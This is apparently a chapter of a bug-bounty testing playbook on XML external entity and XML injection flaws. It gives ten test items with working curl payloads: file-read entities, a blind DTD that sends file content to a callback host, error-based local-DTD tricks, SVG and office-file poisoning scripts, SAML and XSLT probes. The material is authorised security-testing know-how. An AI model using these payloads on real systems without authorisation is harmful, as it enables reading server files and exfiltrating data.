# XXE · XML external entities & XML injection

> An XML parser on the server resolves an entity, a DTD, an XInclude or a stylesheet reference that you wrote. It
> pays when that gives you a file from the server's disk or a response from a host only the server can reach. A
> parser that accepts a DOCTYPE, or a DNS lookup of your DTD host, is a primitive and not a finding.

| | |
|---|---|
| **Class** | `xxe` |
| **Applies when** | http, app\|api |
| **Pays** | 59 disclosed reports, 10 paid, median $1,250, top $6,000. Most of the paid ones were blind: out-of-band exfiltration through an XML endpoint or through an uploaded document or image (PPTX, avatar) on a production host. |
| **Weaknesses** | XML External Entities (XXE) · XML Injection · CWE-611, CWE-91 |

## Why it pays

Modern parsers ship with external entities off, so the bug survives where nobody looks: a SOAP or XML-RPC endpoint
kept for one integration, a JSON API whose framework still registers an XML reader, an office-document or SVG
converter, a SAML endpoint that parses before it verifies, a feed or sitemap importer. The disclosed reports
follow that pattern: blind XXE through a PowerPoint upload (#334488), through an avatar upload (#277341), in a
SOAP endpoint (#762251, #36450), in WebDAV `PROPFIND` (#758978), in a SAML endpoint (#106865), in XMP metadata
inside a JPEG (#836877).

Payout follows what you read. A file from disk or a full-read request to an internal service is high. Blind XXE
with a file exfiltrated over HTTP is high on most programmes; blind XXE that only fetches your DTD is treated as
blind SSRF and rated medium or lower. Entity-expansion denial of service is a different bug, is destructive to
test, and is out of scope here.

## The crux question

**Where does the server parse XML whose prolog, DTD or structure I control, and does that parser load anything
from a URI I name?**

## Applicability probe

Settle `xml-input` for the asset, and note `upload`, `file-processing`, `saml` and `url-fetch` while you are there.

```bash
# 1. XML already in the traffic: content types, SOAP actions, XML bodies
grep -rilE 'content-type: *(application|text)/([a-z0-9.+-]*\+)?xml|soapaction:|<\?xml ' "$E/recon/$H/" | head -20
# 2. Legacy XML endpoints that the application's own front end may never call
for p in '/?wsdl' '/services' '/ws' '/soap' '/xmlrpc.php' '/xmlrpc' '/autodiscover/autodiscover.xml' '/saml/metadata'; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{content_type} $p\n" "$T$p"; done
# 3. Does a JSON endpoint also take XML? Resend one JSON request from the history as XML and read the error.
curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/profile" -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><root><name>xxeprobe</name></root>' -D- | head -30
```

Then walk the authenticated app once for: uploads that accept SVG, DOCX, XLSX, PPTX, GPX, KML or XLIFF; "import
from XML", RSS, OPML or sitemap importers; SSO settings; anything that says XSL, stylesheet or transform.

```bash
scripts/sane fact set "$H" xml-input=1 --ev "POST /api/v1/orders with application/xml answers a SAXParseException"
scripts/sane fact set "$H" xml-input=0 --ev "no XML content type in the history; JSON endpoints answer 415 to application/xml; no SOAP, XML-RPC or WebDAV path"
```

When `xml-input`, `upload`, `saml` and `url-fetch` are all false nothing in this chapter is queued; the planner
writes the reason per item.

## Triage order

XXE-002 (does a JSON endpoint take XML: one request, widens the surface) → XXE-001 (in-band read) → XXE-003
(blind with an external DTD) → XXE-006 (SOAP, XML-RPC, WebDAV) → XXE-007 (SVG upload) → XXE-008 (documents,
metadata, feeds) → XXE-009 (SAML) → XXE-004 (error-based, when outbound connections are blocked) → XXE-005
(XInclude) → XXE-010 (XSLT).

## Items

### XXE-001 · An XML endpoint resolves an external entity and returns the file content in its response

| | |
|---|---|
| **Severity** | High standalone; Critical when the same entity reads cloud metadata credentials (SSR-003) |
| **Requires** | xml-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #312543, #505947, #500515, #248668 |

- **Where:** every request that already carries XML: REST bodies sent as `application/xml` or `text/xml`,
  configuration or data import, "paste XML" fields. Choose an element whose text comes back to you: a name echoed
  in the reply, a validation error that quotes the value, a record you can read after saving.
- **Test:** declare an internal entity first. It proves the DTD is processed and shows where the value is
  reflected without touching the file system. Then declare an external entity that points at a one-line,
  world-readable, non-sensitive file.
- **How:**
  ```bash
  U="$T/api/v1/import"; D="$E/evidence/$H/XXE-001"; mkdir -p "$D"
  # 1. internal entity: is the DTD processed, and where does the value come back?
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' -D "$D/1.hdr" -o "$D/1.body" --data-binary @- <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY xxe001 "xxe001-internal-ok">]>
  <r><name>&xxe001;</name></r>
  EOF
  grep -c 'xxe001-internal-ok' "$D/1.body"
  # 2. external entity (Windows back end: file:///c:/windows/win.ini)
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' -D "$D/2.hdr" -o "$D/2.body" --data-binary @- <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY xxe001 SYSTEM "file:///etc/hostname">]>
  <r><name>&xxe001;</name></r>
  EOF
  ```
  Keep the endpoint's real root and element names; only the DOCTYPE and one entity reference are added. Variants
  for content that breaks the document (several lines, `<`, `&`): on PHP use
  `php://filter/convert.base64-encode/resource=/etc/passwd` as the system identifier; on Java `file:///etc/`
  returns a directory listing. When a WAF rejects the string `<!DOCTYPE` or `<!ENTITY`, send the same document
  re-encoded: `iconv -f UTF-8 -t UTF-16BE doc.xml > doc16.xml` with `encoding="UTF-16BE"` in the XML declaration
  and `Content-Type: application/xml; charset=UTF-16BE`.
- **Proof:** the content of `/etc/hostname` (or `win.ini`) in the HTTP response, with the raw request and response
  saved. One further read of the first lines of `/etc/passwd` is the conventional severity evidence. Name the
  files that matter (application configuration, cloud credential files) in the report and do not pull them unless
  the policy says to.
- **Not a finding when:** the internal entity expands but the external one comes back empty or raises "external
  entity loading is disabled" (libxml2 from 2.9 without `LIBXML_NOENT`, .NET from 4.5.2 with its null resolver):
  the parser allows only internal entities, and what remains is entity-expansion DoS, which is graveyard. Also
  not a finding: the literal text `&xxe001;` comes back (the value was never parsed as an entity), or the server
  answers `DOCTYPE is disallowed` to every document that has one.
- **Escalate:** change the system identifier to `http://` and the entity becomes a full-read SSRF: go to SSR-003
  for cloud metadata and loopback services. Readable framework secrets feed DSR-005 (`web.config` machineKey),
  DSR-009 (Laravel `.env`) and DSR-011 (Rails `secret_key_base`). No reflection anywhere: XXE-003.

### XXE-002 · A JSON endpoint parses the same request as XML when the Content-Type is changed

| | |
|---|---|
| **Severity** | None standalone; High with XXE-001 or XXE-003 through the switched content type |
| **Requires** | api |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #715949, #505947 |

- **Where:** JSON `POST`, `PUT` and `PATCH` endpoints, especially on Java (JAX-RS, Spring MVC with JAXB or
  `jackson-dataformat-xml` on the classpath) and ASP.NET Web API, where the framework selects a body reader from
  the `Content-Type` header. Take three or four endpoints from different controllers; one framework setting
  usually decides all of them.
- **Test:** resend a JSON request with an XML body and an XML content type. A 415 means only JSON is read. An XML
  parser error or a normal success means an XML reader is registered that the developers never tested.
- **How:**
  ```bash
  U="$T/api/v1/profile"; D="$E/evidence/$H/XXE-002"; mkdir -p "$D"
  # 0. baseline, and whether the server can produce XML (its answer shows the element names to mirror)
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' -d '{"name":"xxe002"}' -o /dev/null -w '%{http_code} %{content_type}\n'
  curl -sS "${HDR[@]}" $A "$U" -H 'Accept: application/xml' | head -5
  # 1. the same data as XML
  for ct in 'application/xml' 'text/xml' 'application/xml; charset=utf-8'; do
    curl -sS "${HDR[@]}" $A -X POST "$U" -H "Content-Type: $ct" --data-binary '<?xml version="1.0"?><root><name>xxe002</name></root>' \
      -o "$D/$(printf '%s' "$ct" | tr -c 'a-z' _).body" -w "%{http_code} $ct\n"; done
  # 2. deliberately broken XML: a parser message proves the body reached an XML parser
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' --data-binary '<root><name>xxe002</root>' | head -20
  ```
  Parser messages to look for: `SAXParseException`, `XML document structures must start and end`, `XmlException`,
  `lxml.etree.XMLSyntaxError`, `Nokogiri::XML::SyntaxError`, `Start tag expected`, `JAXBException`. A JAXB error
  of the form `unexpected element (uri:"", local:"root"). Expected elements are <{}profileDto>` gives the root
  element to use. Record the result, then run the XXE-001 documents against the endpoint.
  ```bash
  scripts/sane fact set "$H" xml-input=1 --ev "POST /api/v1/profile accepts application/xml (JAXB error names the root element)"
  ```
- **Proof:** none for this item alone: it records surface. The finding is the XXE-001 or XXE-003 proof obtained
  through the switched content type, with the original JSON request beside it.
- **Not a finding when:** XML is accepted and mapped to the same object but entities are not resolved. Jackson's
  `XmlMapper`, JAXB on current JDKs and .NET `XmlSerializer` on 4.5.2 or later are safe by default, so "the API
  also accepts XML" is closed as informative. A generic 400 that is identical for any non-JSON body is not an XML
  parser.
- **Escalate:** XXE-001, then XXE-003. An XML reader that binds to the same model also bypasses JSON-only input
  filters and WAF rules written for JSON: retry injection payloads from other chapters in the XML form.

### XXE-003 · A blind parser fetches an external DTD and sends a local file to the callback host

| | |
|---|---|
| **Severity** | High standalone when a file arrives; Medium when only the DTD is fetched (treat as blind SSRF) |
| **Requires** | xml-input, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #276276, #296622, #690387, #154096 |

- **Where:** XML sinks that return nothing you control: asynchronous imports, endpoints that answer only
  "accepted", parsers behind a queue. The callback host must be able to serve a file, so an interactsh-only setup
  covers step 1 and not step 2.
- **Test:** parameter entities are resolved inside the DTD, before the document body is looked at. An external DTD
  that you host reads a file into one parameter entity and builds a second entity whose URL contains it.
- **How:**
  ```bash
  U="$T/api/v1/import"
  # 1. which kind of reference triggers a connection? one label per mechanism
  for doc in \
    "<!DOCTYPE r SYSTEM \"http://xxe003-doctype.$OOB/a.dtd\"><r>x</r>" \
    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://xxe003-pe.$OOB/b.dtd\"> %p;]><r>x</r>" \
    "<!DOCTYPE r [<!ENTITY g SYSTEM \"http://xxe003-ge.$OOB/c\">]><r>&g;</r>"; do
    curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' --data-binary "<?xml version=\"1.0\"?>$doc" -o /dev/null -w '%{http_code}\n'; done
  # 2. on the callback host: the DTD and a web server for it
  cat > xxe003.dtd <<EOF
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://xxe003-data.$OOB/?d=%file;'>">
  %wrap;
  %send;
  EOF
  python3 -m http.server 8000
  # 3. the request
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' --data-binary @- <<EOF
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://$OOB:8000/xxe003.dtd"> %dtd;]>
  <r>x</r>
  EOF
  ```
  Per parser:
  - libxml2 (PHP, Python lxml, Ruby Nokogiri): the external DTD loads only when the application enabled it
    (`LIBXML_DTDLOAD`, `LIBXML_NOENT`, lxml `load_dtd`). lxml blocks network DTDs by default (`no_network`) and
    still reads `file://`, so go to XXE-004. On PHP make `%file;` point at
    `php://filter/convert.base64-encode/resource=/etc/passwd` so that any file fits in a URL.
  - Java (Xerces, default JAXP): resolves `http`, `https`, `ftp`, `jar:` and `file:`; `file:///etc/` lists a
    directory. A value with a line break makes the `http://` URL invalid on current JDKs, so prove with a
    one-line file and use XXE-004 for the rest.
  - .NET (`XmlDocument` and `XmlTextReader` before 4.5.2, or any reader given an `XmlUrlResolver`): resolves `http`
    and `file`; use `file:///c:/windows/win.ini`.
- **Proof:** the HTTP request received at `xxe003-data.$OOB` whose query string holds the content of
  `/etc/hostname`, the DTD fetch that preceded it from the same source address, and the request that caused both.
- **Not a finding when:** only DNS arrives (resolvers, mail gateways and security scanners look up host names they
  see in a body). The DTD is fetched and `%send;` never fires: no file was read, so record it as a blind SSRF
  primitive (SSR-001) at most. The fetch comes from an XML-aware proxy or scanner in front of the application:
  compare the source address and User-Agent with a callback from a known application feature.
- **Escalate:** outbound connections blocked but errors shown: XXE-004. Point `%file;` at an internal `http://`
  URL to turn the same DTD into SSRF with exfiltration: SSR-003.

### XXE-004 · A parser error message discloses file content through a redefined entity of a local DTD

| | |
|---|---|
| **Severity** | High standalone |
| **Requires** | xml-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #486732, #315837 |

- **Where:** XML sinks that return parser errors in the response (or in a job log you can read) and sit behind an
  egress filter, so XXE-003 gets no callback.
- **Test:** XML forbids a parameter-entity reference inside a declaration in the internal subset, which stops the
  XXE-003 trick without an external DTD. A DTD file that already exists on the server is external: load it, and
  redefine one of the parameter entities it uses so that your declarations are expanded in its context. The
  injected declarations read a file and then reference a path that does not exist and contains the file's
  content. The "file not found" error carries it back.
- **How:**
  ```bash
  U="$T/api/v1/import"
  # 1. is there an error channel, and which DTD exists? A missing file and an existing one must answer differently.
  for f in /nonexistent-xxe004.dtd /usr/share/yelp/dtd/docbookx.dtd /usr/share/xml/fontconfig/fonts.dtd; do
    curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' \
      --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % l SYSTEM \"file://$f\"> %l;]><r>x</r>" | head -c 300; echo " <- $f"; done
  # 2. redefine an entity of the DTD that exists (docbookx.dtd uses %ISOamso;)
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/xml' --data-binary @- <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE r [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
      <!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
      &#x25;eval;
      &#x25;error;
    '>
    %local_dtd;
  ]>
  <r>x</r>
  EOF
  ```
  Other hosts: `/usr/share/xml/fontconfig/fonts.dtd` uses `%constant;` inside an element declaration, so the
  redefinition must close and reopen that declaration: start the value with `aaa)>` and end it with
  `<!ELEMENT aa (bb`. On Windows `C:\Windows\System32\wbem\xml\cim20.dtd` uses `%SuperClass;`. On Java the DTD
  can sit inside a jar on the classpath (`jar:file:///path/lib.jar!/path/file.dtd`). When the parser can reach
  your host, skip the local DTD: serve the XXE-003 DTD with `'file:///nonexistent/%file;'` in place of the
  `http://` URL.
- **Proof:** the response containing the parser error with `/nonexistent/` followed by the content of
  `/etc/hostname`, and the request.
- **Not a finding when:** errors are generic (no path or parser text comes back): nothing can be read this way.
  Recent libxml2 rejects the redefinition with `PEReferences forbidden in internal subset` (observed with libxml2
  2.15), so PHP, Python and Ruby targets on current distributions are negative; Xerces on Java still expands it.
  An error that only repeats the path you sent (`/nonexistent-xxe004.dtd`) shows the error channel and no read.
- **Escalate:** a multi-line file in the error message works on Java where it fails over HTTP: use it for the
  XXE-001 severity evidence. Then SSR-003 through an `http://` system identifier, read back through the same
  error.

### XXE-005 · A parameter value is embedded in a server-side XML document and XInclude is processed

| | |
|---|---|
| **Severity** | High standalone when file content is returned; Medium for XML injection that changes a sibling element |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML Injection · CWE-91 |
| **Prior art** | #997381, #1150799 |

- **Where:** form or JSON parameters that a back end copies into an XML or SOAP message: stock and price checks,
  payment and shipping integrations, search against a legacy system, "export as XML". You do not control the
  DOCTYPE here, so entities are not available. Signals: a value containing `<` or a bare `&` produces a 500 or a
  parser message; the response is XML or a SOAP fault.
- **Test:** first show that the value is not escaped when placed in the document. Then supply an element in the
  XInclude namespace: a parser with XInclude enabled replaces it with the content of the referenced file.
- **How:**
  ```bash
  U="$T/product/stock"
  # 1. escaping: a well-formed element should pass, a bare ampersand and an unclosed tag should break the document
  for v in '1' '1<x/>' '1&' '1<x>'; do
    curl -sS "${HDR[@]}" $A -X POST "$U" --data-urlencode "productId=$v" -o /dev/null -w "%{http_code} %{size_download} [$v]\n"; done
  # 2. XInclude, text mode, one-line file
  curl -sS "${HDR[@]}" $A -X POST "$U" --data-urlencode \
    'productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>'
  ```
  For JSON bodies put the same string in the value, with the quotes escaped.
- **Proof:** the content of `/etc/hostname` in the response where the parameter value is normally echoed, plus the
  step 1 table showing the value reaches the XML document unescaped.
- **Not a finding when:** the value is escaped (`&lt;foo`), which is the normal case; or it is unescaped but
  XInclude is off. XInclude is opt-in in every mainstream parser (libxml2 `XML_PARSE_XINCLUDE`, Java
  `setXIncludeAware(true)`), so most unescaped sinks stop at XML injection.
- **Escalate:** with unescaped injection and no XInclude, close the current element and add a sibling the back end
  trusts (`1</productId><price>0</price><productId>1`, a role, an account id): that is XML injection (CWE-91) and
  is rated on the business effect, proven on our own account. Chain with BIZ and BAC items.

### XXE-006 · A SOAP, XML-RPC or WebDAV endpoint outside the main application flow resolves external entities

| | |
|---|---|
| **Severity** | High standalone |
| **Requires** | xml-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #762251, #36450, #758978, #315837 |

- **Where:** endpoints the front end never calls and that were therefore never hardened: `?wsdl`, `/services`,
  `/ws`, `.asmx`, `.svc`, `/soap`, `/xmlrpc`, `/autodiscover/autodiscover.xml`, and any path that answers
  `PROPFIND` with 207. Find them from the applicability probe, the WSDL (`api-docs`), mobile and desktop client
  traffic, and old JavaScript bundles.
- **Test:** the SOAP specification forbids a DOCTYPE and current stacks (CXF, Axis2, WCF) reject it. Legacy stacks
  and hand-written handlers do not. Send a well-formed message for an existing operation with a DOCTYPE added,
  and place the entity where the response or the fault echoes a string.
- **How:**
  ```bash
  D="$E/evidence/$H/XXE-006"; mkdir -p "$D"
  # SOAP: take one operation and its namespace from the WSDL; put the entity in a string parameter
  curl -sS "${HDR[@]}" -X POST "$T/services/Lookup" -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: ""' -D "$D/soap.hdr" -o "$D/soap.body" --data-binary @- <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE s [<!ENTITY xxe006 SYSTEM "file:///etc/hostname">]>
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>
    <lookup><name>&xxe006;</name></lookup>
  </soapenv:Body></soapenv:Envelope>
  EOF
  # XML-RPC: an unknown method name is quoted in the fault string
  curl -sS "${HDR[@]}" -X POST "$T/xmlrpc" -H 'Content-Type: text/xml' -o "$D/rpc.body" --data-binary \
    '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY xxe006 SYSTEM "file:///etc/hostname">]><methodCall><methodName>&xxe006;</methodName></methodCall>'
  # WebDAV: PROPFIND with a DOCTYPE; property names and hrefs are echoed in the 207 body
  curl -sS "${HDR[@]}" $A -X PROPFIND "$T/remote.php/dav/" -H 'Depth: 0' -H 'Content-Type: application/xml' -o "$D/dav.body" --data-binary \
    '<?xml version="1.0"?><!DOCTYPE p [<!ENTITY xxe006 SYSTEM "file:///etc/hostname">]><d:propfind xmlns:d="DAV:"><d:prop><d:displayname>&xxe006;</d:displayname></d:prop></d:propfind>'
  head -c 600 "$D"/*.body
  ```
  With no echo, run the XXE-003 documents against the same endpoint (needs `oob`).
- **Proof:** the file content in the SOAP response, the XML-RPC fault string or the multistatus body, raw request
  and response saved.
- **Not a finding when:** the stack answers `DOCTYPE is not allowed`, `DTD is prohibited` or a SOAP fault for any
  document with a DOCTYPE. A WordPress `xmlrpc.php` that is merely enabled is graveyard. An endpoint on a vendor's
  host (a hosted payment or mail autodiscover service) is `third-party`.
- **Escalate:** SOAP services often run with more privilege than the web tier and are reachable without a session:
  say so in the report when the request carried no credentials. Then XXE-003 and SSR-003.

### XXE-007 · An uploaded SVG is parsed with external entities enabled by the image converter

| | |
|---|---|
| **Severity** | High standalone when file content appears in the converted image or at the callback host; Medium for a server-side fetch only |
| **Requires** | upload, file-processing |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #897244, #347139, #277341, #845832 |

- **Where:** avatar, logo, emblem, attachment and "import design" uploads where the stored file differs from the
  uploaded one: a PNG or JPEG thumbnail, a resized copy, a PDF. That difference means a server-side renderer
  (librsvg, ImageMagick, Batik, Inkscape, a headless browser) parsed the SVG.
- **Test:** an entity whose replacement text is drawn as SVG text ends up as pixels in the converted image. That
  gives an in-band read with no callback host.
- **How:**
  ```bash
  cat > xxe007.svg <<'EOF'
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE svg [<!ENTITY xxe007 SYSTEM "file:///etc/hostname">]>
  <svg xmlns="http://www.w3.org/2000/svg" width="900" height="120">
    <rect width="900" height="120" fill="white"/><text x="10" y="60" font-size="28" fill="black">xxe007:&xxe007;</text>
  </svg>
  EOF
  curl -sS "${HDR[@]}" $A -F "file=@xxe007.svg;type=image/svg+xml" "$T/api/avatar" -D- -o up.json
  # fetch the converted copy the application now serves for this upload and look at it
  THUMB=$(grep -oE 'https?://[^"]+\.(png|jpe?g|webp)[^"]*' up.json | head -1)
  curl -sS "${HDR[@]}" $A "$THUMB" -o "$E/evidence/$H/XXE-007/thumb.png"; file "$E/evidence/$H/XXE-007/thumb.png"
  ```
  If the upload filter checks the extension or MIME type only, send the same bytes as `x.png` with
  `type=image/png`: ImageMagick and librsvg detect SVG from the content. Blind variant (needs `oob`): replace the
  DOCTYPE with `<!DOCTYPE svg [<!ENTITY % d SYSTEM "http://xxe007.$OOB/d.dtd"> %d;]>` and serve the XXE-003 DTD.
- **Proof:** the converted image showing `xxe007:` followed by the server's host name, attached with the uploaded
  SVG and the upload request. For the blind variant, the exfiltration request as in XXE-003.
- **Not a finding when:** the SVG is stored and served back byte for byte. Then it is parsed only by the viewer's
  browser, which does not resolve external entities: that is the stored-XSS question (XSS and UPL chapters), not
  XXE. Also not a finding: the image shows `xxe007:` with nothing after it (entities off), or the callback comes
  from your own browser when you open the file.
- **Escalate:** an `<image xlink:href="http://...">` fetch from the converter is SSRF: SSR-008. A converter that
  reads `file://` through `xlink:href` or `xi:include` instead of an entity is a path-traversal or CVE finding in
  the renderer: LFI and CVE chapters.

### XXE-008 · An uploaded or imported XML-based file (DOCX, XLSX, PPTX, XMP, GPX, XLIFF, RSS, sitemap) is parsed with external entities enabled

| | |
|---|---|
| **Severity** | High standalone when a file is exfiltrated or shown in the imported data; Medium when only the DTD is fetched |
| **Requires** | upload\|url-fetch, file-processing, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #334488, #836877, #232614, #1156748 |

- **Where:** document preview, text extraction and indexing, spreadsheet import, translation-file import (XLIFF,
  TMX), GPS track import (GPX, KML), image metadata readers (XMP inside JPEG, PNG or PDF), and importers that
  fetch a feed, OPML file or sitemap from a URL you give.
- **Test:** office files are ZIP archives of XML parts and the server parses several of them. Add a DOCTYPE with a
  parameter entity to one part at a time, each with its own callback label, so the callback names the part and
  the library that parsed it.
- **How:**
  ```bash
  # one output file per poisoned part, from any valid document created in an office suite
  OOB="$OOB" python3 - clean.docx <<'PY'
  import os, re, sys, zipfile
  src, oob = sys.argv[1], os.environ['OOB']
  parts = [n for n in zipfile.ZipFile(src).namelist() if n.endswith(('.xml', '.rels'))][:8]
  for n, part in enumerate(parts):
      out = f'xxe008-p{n}.' + src.rsplit('.', 1)[1]
      doctype = f'<!DOCTYPE x [<!ENTITY % d SYSTEM "http://xxe008-p{n}.{oob}/d.dtd"> %d;]>'.encode()
      with zipfile.ZipFile(src) as zin, zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as zout:
          for i in zin.infolist():
              data = zin.read(i.filename)
              if i.filename == part:
                  data = re.sub(rb'(<\?xml[^>]*\?>)', lambda m: m.group(1) + doctype, data, count=1)
              zout.writestr(i, data)
      print(out, part)
  PY
  for f in xxe008-p*.docx; do curl -sS "${HDR[@]}" $A -F "file=@$f" "$T/api/documents" -o /dev/null -w "%{http_code} $f\n"; sleep 2; done
  ```
  The same script works for `.xlsx` and `.pptx`. Plain XML formats take the DOCTYPE directly after the XML
  declaration:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE gpx [<!ENTITY % d SYSTEM "http://xxe008-gpx.OOB/d.dtd"> %d;]>
  <gpx version="1.1" creator="xxe008"><wpt lat="0" lon="0"><name>xxe008</name></wpt></gpx>
  ```
  XMP: write a packet that starts with the same DOCTYPE into an image (`exiftool '-xmp<=packet.xmp' photo.jpg`)
  and upload it. Feed and sitemap importers: host the XML on the callback host and submit its URL. When a part
  calls back, serve the XXE-003 DTD from that label to exfiltrate `/etc/hostname`. For an in-band read in a
  spreadsheet import, put a general entity in a cell of `xl/sharedStrings.xml` and read the imported value.
- **Proof:** the exfiltration request with the content of `/etc/hostname`, the poisoned file, the name of the part
  that was parsed and the upload request. In-band: the imported record showing the file content.
- **Not a finding when:** the callback comes from a third-party viewer or scanner the file was handed to (an
  online office viewer, an antivirus sandbox): source address and User-Agent tell, and it is `third-party`. Also
  not a finding: DNS only, or the DTD fetch arrives when you open the file in your own office suite.
- **Escalate:** the same documents also carry external images and OLE links: SSR-008. A crawler or importer that
  is reachable without an account raises severity: say so.

### XXE-009 · The SAML endpoint parses a document with a DOCTYPE before it validates the signature

| | |
|---|---|
| **Severity** | High standalone when a file is exfiltrated; Medium when only the DTD is fetched |
| **Requires** | saml, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | XML External Entities (XXE) · CWE-611 |
| **Prior art** | #106865 |

- **Where:** the assertion consumer service (`/saml/acs`, `/saml/consume`, `/sso/saml`,
  `/Shibboleth.sso/SAML2/POST`), single-logout endpoints, an identity-provider endpoint that takes `SAMLRequest`,
  and SSO settings that accept identity-provider metadata as an upload or URL (in our own tenant).
- **Test:** signature validation needs a parsed document, so the XML parser sees attacker bytes without any
  authentication. No valid assertion is required: send a minimal response with a DOCTYPE.
- **How:**
  ```bash
  cat > saml.xml <<EOF
  <?xml version="1.0"?>
  <!DOCTYPE samlp:Response [<!ENTITY % d SYSTEM "http://xxe009-acs.$OOB/d.dtd"> %d;]>
  <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_xxe009" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"><saml:Issuer>xxe009</saml:Issuer></samlp:Response>
  EOF
  # POST binding: base64 only
  curl -sS "${HDR[@]}" -X POST "$T/saml/acs" --data-urlencode "SAMLResponse=$(base64 -w0 saml.xml)" -D- -o "$E/evidence/$H/XXE-009/acs.body"
  # Redirect binding (SAMLRequest to an identity provider): raw deflate, base64, URL-encode
  Q=$(python3 -c "import sys,zlib,base64,urllib.parse;d=open('saml.xml','rb').read();print(urllib.parse.quote(base64.b64encode(zlib.compress(d)[2:-4])))")
  curl -sS "${HDR[@]}" "$T/saml/sso?SAMLRequest=$Q" -D- -o /dev/null
  ```
  When the label is hit, serve the XXE-003 DTD from it. In-band alternative: many endpoints quote the issuer in
  their error ("unknown issuer ..."), so `<!ENTITY i SYSTEM "file:///etc/hostname">` with
  `<saml:Issuer>&i;</saml:Issuer>` can return the content directly.
- **Proof:** the exfiltration request with the content of `/etc/hostname`, or the error page quoting it as the
  issuer, plus the unauthenticated request that caused it.
- **Not a finding when:** the endpoint answers the same error with and without the DOCTYPE and no callback
  arrives: current SAML libraries (OpenSAML with its default parser pool, ruby-saml, python3-saml with
  defusedxml) refuse a DOCTYPE. A callback from the identity provider's own infrastructure (a hosted IdP the flow
  passed through) is `third-party`.
- **Escalate:** the remaining SAML attacks (signature wrapping, comment truncation, unsigned assertions) are in
  the OAU chapter. An XSLT `Transform` inside `ds:Signature` is XXE-010 reached before authentication.

### XXE-010 · A user-supplied XSLT stylesheet is executed by the server and reads files or calls out

| | |
|---|---|
| **Severity** | High standalone for file read or internal requests; Critical when an extension function returns the output of a harmless call |
| **Requires** | xml-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML Injection · CWE-91 |
| **Prior art** | #19678, #19677, #974368 |

- **Where:** features that take a stylesheet or apply one named by a parameter: custom export and report
  templates, "XSL transform" options in integration tools, parameters called `xsl`, `xslt`, `stylesheet`,
  `transform` or `template`, XML documents whose `<?xml-stylesheet?>` instruction is honoured server-side, and
  `ds:Transform` elements in signed XML.
- **Test:** fingerprint the processor with `system-property()`, which has no side effect. The vendor decides what
  is available: `document()` reads any well-formed XML file and makes HTTP requests on every processor;
  `unparsed-text()` reads any text file on XSLT 2.0 processors (Saxon); extension functions run code on Xalan,
  libxslt with PHP functions registered, and .NET with scripting enabled.
- **How:**
  ```bash
  cat > xxe010.xsl <<'EOF'
  <?xml version="1.0"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      xxe010 version=<xsl:value-of select="system-property('xsl:version')"/>
      vendor=<xsl:value-of select="system-property('xsl:vendor')"/>
      url=<xsl:value-of select="system-property('xsl:vendor-url')"/>
    </xsl:template>
  </xsl:stylesheet>
  EOF
